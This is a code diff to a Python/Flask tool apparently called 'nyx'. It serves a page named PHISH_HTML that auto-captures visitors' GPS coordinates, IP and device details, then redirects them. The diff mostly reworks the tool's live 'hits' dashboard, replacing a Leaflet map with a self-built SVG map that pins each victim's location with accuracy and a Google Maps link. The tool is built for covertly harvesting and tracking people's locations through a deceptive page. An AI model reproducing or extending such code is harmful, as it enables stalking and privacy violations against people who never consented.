@@ -208,19 +208,20 @@ window.onload=autoCapture;
 </body>
 </html>"""
 
-DASH_HTML = """<!DOCTYPE html>
+DASH_TMPL = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>nyx – dashboard</title>
-<link rel="stylesheet" href="/leaflet.css"/>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{width:100%;height:100%;overflow:hidden;background:#0d1117;color:#e6edf3;font-family:'Segoe UI',sans-serif}
-body{display:flex}
-#map{flex:1;height:100vh;background:#0a0f1e}.leaflet-container{background:#0a0f1e!important}
-#sidebar{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden;height:100vh}
+body{display:flex;flex-direction:row}
+#mapwrap{position:relative;flex:1;overflow:hidden;background:#0a0f1e;cursor:grab}
+#mapwrap:active{cursor:grabbing}
+#mapsvg{position:absolute;top:0;left:0;width:100%;height:100%}
+#sidebar{width:340px;min-width:280px;background:#161b22;display:flex;flex-direction:column;border-left:1px solid #30363d;overflow:hidden;height:100vh;flex-shrink:0}
 .hdr{padding:14px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
 .brand{font-size:1.1rem;font-weight:700;color:#58a6ff}
 .live-dot{width:8px;height:8px;border-radius:50%;background:#3fb950;display:inline-block;margin-right:6px;animation:pulse 1.4s infinite}
@@ -252,16 +253,26 @@ body{display:flex}
 .omaps{display:inline-block;margin-top:8px;font-size:.75rem;color:#58a6ff;text-decoration:none;background:#1a2a3a;border:1px solid #58a6ff;border-radius:6px;padding:4px 10px}
 .status-bar{padding:6px 16px;font-size:.72rem;color:#8b949e;border-top:1px solid #30363d;flex-shrink:0}
 #empty{text-align:center;color:#8b949e;font-size:.85rem;padding:40px 20px}
+.tip{position:fixed;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:8px 12px;font-size:.75rem;pointer-events:none;display:none;z-index:99;max-width:220px;line-height:1.5}
 </style>
 </head>
 <body>
-<div id="map"></div>
+<div id="mapwrap">
+  <svg id="mapsvg" xmlns="http://www.w3.org/2000/svg">
+    <g id="view">
+      <rect id="ocean" fill="#0a0f1e"/>
+      <path id="land" fill="#1c2333" stroke="#2d3748" stroke-width="0.5" stroke-linejoin="round"/>
+      <g id="mlayer"></g>
+    </g>
+  </svg>
+  <div class="tip" id="tip"></div>
+</div>
 <div id="sidebar">
   <div class="hdr">
     <span class="brand">nyx</span>
     <span><span class="live-dot"></span><span id="live-lbl">LIVE</span></span>
     <span id="hit-count" style="font-size:.8rem;color:#8b949e;background:#0d1117;padding:3px 10px;border-radius:12px">0 hits</span>
-    <button class="clr" onclick="clearAll()" style="color:#f85149">🗑 Clear All</button>
+    <button class="clr" onclick="clearAll()" style="color:#f85149">Clear All</button>
   </div>
   <div class="stats">
     <div class="stat"><div class="n g" id="sg">0</div><div class="l">GPS</div></div>
@@ -272,10 +283,96 @@ body{display:flex}
   <div id="feed"><div id="empty">No captures yet.<br/>Waiting for hits…</div></div>
   <div class="status-bar" id="sbar">connecting…</div>
 </div>
-<script src="/leaflet.js"></script>
 <script>
-var map=null,markers={},seen=new Set(),stats={g:0,d:0,a:0};
+// --- Map: pure SVG, no dependencies ---
+var W=1000,H=500;
+var vt={x:0,y:0,s:1};
+var pinData={};
+var seen=new Set(),stats={g:0,d:0,a:0};
+
+function merc(lat,lon){
+  var x=(lon+180)/360*W;
+  var s=Math.sin(lat*Math.PI/180);
+  s=Math.max(-0.9999,Math.min(0.9999,s));
+  var y=(0.5-Math.log((1+s)/(1-s))/(4*Math.PI))*H;
+  return[x,y];
+}
+function applyView(){
+  document.getElementById('view').setAttribute('transform',
+    'translate('+vt.x+','+vt.y+') scale('+vt.s+')');
+  document.getElementById('ocean').setAttribute('x',-vt.x/vt.s);
+  document.getElementById('ocean').setAttribute('y',-vt.y/vt.s);
+  document.getElementById('ocean').setAttribute('width',W/vt.s+Math.abs(vt.x)/vt.s*2+10000);
+  document.getElementById('ocean').setAttribute('height',H/vt.s+Math.abs(vt.y)/vt.s*2+10000);
+}
+function initMap(){
+  var wrap=document.getElementById('mapwrap');
+  var svg=document.getElementById('mapsvg');
+  svg.setAttribute('viewBox','0 0 '+W+' '+H);
+  svg.setAttribute('preserveAspectRatio','xMidYMid meet');
+  // fit to viewport
+  var bw=wrap.clientWidth,bh=wrap.clientHeight;
+  var sc=Math.min(bw/W,bh/H);
+  vt.s=sc; vt.x=(bw-W*sc)/2; vt.y=(bh-H*sc)/2;
+  applyView();
+
+  // zoom
+  wrap.addEventListener('wheel',function(e){
+    e.preventDefault();
+    var r=wrap.getBoundingClientRect();
+    var mx=e.clientX-r.left,my=e.clientY-r.top;
+    var f=e.deltaY<0?1.2:1/1.2;
+    vt.x=mx+(vt.x-mx)*f; vt.y=my+(vt.y-my)*f; vt.s*=f;
+    applyView();
+  },{passive:false});
+
+  // pan
+  var drag=null;
+  wrap.addEventListener('mousedown',function(e){drag={sx:vt.x,sy:vt.y,mx:e.clientX,my:e.clientY};});
+  window.addEventListener('mousemove',function(e){
+    if(!drag)return;
+    vt.x=drag.sx+(e.clientX-drag.mx); vt.y=drag.sy+(e.clientY-drag.my);
+    applyView();
+  });
+  window.addEventListener('mouseup',function(){drag=null;});
+
+  // set world path
+  document.getElementById('land').setAttribute('d','__WORLDPATH__');
+}
+
+function screenXY(lat,lon){
+  var p=merc(lat,lon);
+  return[p[0]*vt.s+vt.x, p[1]*vt.s+vt.y];
+}
 function accColor(a){return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}
+
+function addPin(d){
+  if(!d.lat||!d.lon)return;
+  var p=merc(d.lat,d.lon);
+  var col=accColor(d.acc);
+  var ns='http://www.w3.org/2000/svg';
+  var g=document.createElementNS(ns,'g');
+  g.setAttribute('data-id',d._id);
+  var pulse=document.createElementNS(ns,'circle');
+  pulse.setAttribute('cx',p[0]);pulse.setAttribute('cy',p[1]);
+  pulse.setAttribute('r',12/vt.s);pulse.setAttribute('fill',col);pulse.setAttribute('opacity','0.25');
+  var dot=document.createElementNS(ns,'circle');
+  dot.setAttribute('cx',p[0]);dot.setAttribute('cy',p[1]);
+  dot.setAttribute('r',5/vt.s);dot.setAttribute('fill',col);
+  dot.setAttribute('stroke','#fff');dot.setAttribute('stroke-width',1.5/vt.s);
+  dot.style.cursor='pointer';
+  var tip=document.getElementById('tip');
+  dot.addEventListener('mouseenter',function(e){
+    tip.innerHTML='<b>'+d._ip+'</b><br/>'+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+'<br/>Acc: +/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank" style="color:#58a6ff">Open Maps</a>';
+    tip.style.display='block';tip.style.left=(e.clientX+12)+'px';tip.style.top=(e.clientY-10)+'px';
+  });
+  dot.addEventListener('mousemove',function(e){tip.style.left=(e.clientX+12)+'px';tip.style.top=(e.clientY-10)+'px';});
+  dot.addEventListener('mouseleave',function(){tip.style.display='none';});
+  g.appendChild(pulse);g.appendChild(dot);
+  document.getElementById('mlayer').appendChild(g);
+  pinData[d._id]=g;
+}
+
 function f(l,v){return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}
 function updateStats(){document.getElementById('sg').textContent=stats.g;document.getElementById('sd').textContent=stats.d;document.getElementById('sa').textContent=stats.a;var t=stats.g+stats.d+stats.a;document.getElementById('hit-count').textContent=t+' hit'+(t===1?'':'s');}
 function addCard(d){
@@ -290,8 +387,7 @@ function addCard(d){
     var lbl=acc==null?'Unknown':acc<=20?'High +/-'+acc+'m':acc<=100?'Med +/-'+acc+'m':'Low +/-'+acc+'m';
     fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A')+f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A')+f('Accuracy',acc!=null?'+/- '+acc+' m':'N/A')+f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
     fields+='<div class="f wide"><div class="lb">'+lbl+'</div><div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
-    if(map&&d.lat!=null&&d.lon!=null){var mk=L.circleMarker([d.lat,d.lon],{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}).addTo(map);mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+'<br/>+/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');markers[d._id]=mk;}
-    stats.g++;
+    addPin(d);stats.g++;
   }else if(isDeny){fields+=f('Reason',d.reason);stats.d++;}
   else{
     var devIcon=d.deviceType==='Mobile'?'Mobile':d.deviceType==='Tablet'?'Tablet':'Desktop';
@@ -310,43 +406,55 @@ function addCard(d){
   document.getElementById('feed').prepend(div);updateStats();
 }
 function setOk(ok){document.getElementById('sbar').textContent=ok?'Connected - polling every 2s':'Lost connection...';document.getElementById('sbar').style.color=ok?'#3fb950':'#f85149';document.getElementById('live-lbl').textContent=ok?'LIVE':'OFFLINE';}
-function clearView(){seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting...</div>';stats={g:0,d:0,a:0};updateStats();if(map)Object.values(markers).forEach(function(m){map.removeLayer(m);});markers={};}
+function clearView(){seen=new Set();document.getElementById('feed').innerHTML='<div id="empty">Cleared. Waiting...</div>';stats={g:0,d:0,a:0};updateStats();var ml=document.getElementById('mlayer');while(ml.firstChild)ml.removeChild(ml.firstChild);pinData={};}
 function clearAll(){if(!confirm('Clear all captures?'))return;fetch('/api/clear',{method:'POST'}).then(function(){clearView();});}
 function poll(){
   fetch('/api/captures').then(function(r){return r.json();}).then(function(list){
-    setOk(true);
-    var newOnes=list.filter(function(c){return !seen.has(c._id);});
-    list.forEach(function(c){addCard(c);});
-    if(map&&newOnes.length===1&&newOnes[0].lat!=null){var c=newOnes[0];map.flyTo([c.lat,c.lon],Math.min(15,Math.max(10,16-Math.log2((c.acc||500)+1))),{animate:true,duration:1.5});if(markers[c._id])markers[c._id].openPopup();}
-    else if(map&&newOnes.length>1){var gps=newOnes.filter(function(c){return c.lat!=null;});if(gps.length>0){var b=L.latLngBounds(gps.map(function(c){return[c.lat,c.lon];}));map.fitBounds(b,{padding:[60,60],animate:true,duration:1.0,maxZoom:13});}}
-  }).catch(function(e){setOk(false);console.error('poll error',e);});
+    setOk(true);list.forEach(function(c){addCard(c);});
+  }).catch(function(e){setOk(false);});
 }
-document.addEventListener('DOMContentLoaded',function(){
-  try{
-    map=L.map('map',{attributionControl:false,zoomSnap:0.5,wheelPxPerZoomLevel:120,worldCopyJump:true}).setView([20,20],2);
-    fetch('/world.geojson').then(function(r){return r.json();}).then(function(geo){
-      L.geoJSON(geo,{
-        style:{fillColor:'#1c2333',fillOpacity:1,color:'#2d3748',weight:0.8}
-      }).addTo(map);
-    });
-    setTimeout(function(){map.invalidateSize();},200);
-  }catch(err){console.error('map init failed',err);}
-  poll();
-  setInterval(poll,2000);
-});
+initMap();
+poll();
+setInterval(poll,2000);
 </script>
 </body>
 </html>"""
 
+def _geo_svg_path(w=1000, h=500):
+    import math
+    geo_file = os.path.join(TEMPLATE_DIR, 'world.geojson')
+    if not os.path.exists(geo_file):
+        return ''
+    with open(geo_file) as f:
+        geo = json.load(f)
+    def merc(lat, lon):
+        x = (lon + 180) / 360 * w
+        s = math.sin(math.radians(max(-85.05, min(85.05, lat))))
+        y = (0.5 - math.log((1 + s) / (1 - s)) / (4 * math.pi)) * h
+        return round(x, 1), round(y, 1)
+    parts = []
+    for feat in geo.get('features', []):
+        g = feat['geometry']
+        rings = g['coordinates'] if g['type'] == 'Polygon' else [r for poly in g['coordinates'] for r in poly]
+        for ring in rings:
+            pts = [merc(c[1], c[0]) for c in ring]
+            if not pts:
+                continue
+            d = 'M{},{}'.format(pts[0][0], pts[0][1])
+            d += ''.join('L{},{}'.format(x, y) for x, y in pts[1:])
+            d += 'Z'
+            parts.append(d)
+    return ''.join(parts)
+
 def _build_dash():
-    return DASH_HTML
+    path = _geo_svg_path()
+    return DASH_TMPL.replace('__WORLDPATH__', path)
 
 def run(redirect_url: str):
     log_file = os.path.join(TEMPLATE_DIR, 'captures.json')
     _load_captures(log_file)
 
-    logo   = _logo_b64()
-    ljs, lcss = _leaflet()
+    logo      = _logo_b64()
     phish_html = PHISH_HTML.replace('__LOGO__', logo).replace('__REDIRECT__', redirect_url)
     dash_html  = _build_dash()
 
@@ -388,37 +496,6 @@ def run(redirect_url: str):
     def dash_index():
         return Response(dash_html, mimetype='text/html',
                         headers={'Cache-Control': 'no-store'})
-
-    @dash_app.route('/leaflet.js')
-    def dash_leafletjs():
-        return Response(ljs, mimetype='application/javascript',
-                        headers={'Cache-Control': 'public, max-age=86400'})
-
-    @dash_app.route('/leaflet.css')
-    def dash_leafletcss():
-        return Response(lcss, mimetype='text/css',
-                        headers={'Cache-Control': 'public, max-age=86400'})
-
-    @dash_app.route('/world.geojson')
-    def dash_world():
-        p = os.path.join(TEMPLATE_DIR, 'world.geojson')
-        with open(p) as f: data = f.read()
-        return Response(data, mimetype='application/json',
-                        headers={'Cache-Control': 'public, max-age=86400'})
-
-    @dash_app.route('/tiles/<int:z>/<int:x>/<int:y>')
-    def dash_tiles(z, x, y):
-        subdomains = ['a', 'b', 'c', 'd']
-        s = subdomains[(x + y) % 4]
-        url = f'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}.png'
-        try:
-            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-            with urllib.request.urlopen(req, timeout=8) as resp:
-                data = resp.read()
-            return Response(data, mimetype='image/png',
-                            headers={'Cache-Control': 'public, max-age=86400'})
-        except Exception:
-            return Response(status=204)
 
     @dash_app.route('/api/captures')
     def api_captures(): return Response(json.dumps(list(captures), default=str), mimetype='application/json')
